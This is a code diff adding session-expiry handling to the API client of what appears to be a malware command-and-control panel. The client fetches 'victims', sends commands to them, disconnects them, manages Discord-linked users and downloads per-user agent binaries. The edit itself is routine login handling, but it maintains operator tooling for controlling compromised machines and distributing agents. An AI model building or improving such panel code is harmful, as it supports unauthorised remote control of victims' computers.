@@ -8,11 +8,21 @@ function buildHeaders(token?: string): Record<string, string> {
   return headers;
 }
 
+function handleUnauthorized() {
+  if (typeof window !== "undefined") {
+    sessionStorage.removeItem("token");
+    sessionStorage.removeItem("user");
+    document.cookie = "token=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT";
+    window.location.href = "/login";
+  }
+}
+
 export async function getVictims(token?: string): Promise<Victim[]> {
   const res = await fetch(`${getApiUrl()}/api/victims`, {
     cache: "no-store",
     headers: buildHeaders(token),
   });
+  if (res.status === 401) { handleUnauthorized(); return []; }
   if (!res.ok) throw new Error("Failed to fetch victims");
   return res.json();
 }
@@ -31,6 +41,7 @@ export async function sendCommand(
       body: JSON.stringify({ command, command_type: commandType }),
     }
   );
+  if (res.status === 401) { handleUnauthorized(); return; }
   if (!res.ok) throw new Error("Failed to send command");
 }
 
@@ -45,6 +56,7 @@ export async function disconnectVictim(
       headers: buildHeaders(token),
     }
   );
+  if (res.status === 401) { handleUnauthorized(); return; }
   if (!res.ok) throw new Error("Failed to disconnect");
 }
 
@@ -75,6 +87,7 @@ export async function createUser(
     body: JSON.stringify({ discordId: discordId }),
   });
   if (!res.ok) {
+    if (res.status === 401) { handleUnauthorized(); throw new Error("Unauthorized"); }
     await res.json().catch(() => ({}));
     throw new Error("Failed to create user");
   }
@@ -85,6 +98,7 @@ export async function getUsers(token: string): Promise<ManagedUser[]> {
   const res = await fetch(`${getApiUrl()}/api/admin/users`, {
     headers: buildHeaders(token),
   });
+  if (res.status === 401) { handleUnauthorized(); throw new Error("Unauthorized"); }
   if (!res.ok) throw new Error("Failed to fetch users");
   const data = await res.json();
   return data.users ?? [];
@@ -98,6 +112,7 @@ export async function downloadAgent(
     `${getApiUrl()}/api/admin/users/${encodeURIComponent(userId)}/agent`,
     { headers: buildHeaders(token) }
   );
+  if (res.status === 401) { handleUnauthorized(); throw new Error("Unauthorized"); }
   if (!res.ok) throw new Error("Failed to download agent");
   return res.blob();
 }
@@ -106,6 +121,7 @@ export async function downloadMyAgent(token: string): Promise<Blob> {
   const res = await fetch(`${getApiUrl()}/api/me/agent`, {
     headers: buildHeaders(token),
   });
+  if (res.status === 401) { handleUnauthorized(); throw new Error("Unauthorized"); }
   if (!res.ok) throw new Error("Failed to download agent");
   return res.blob();
 }
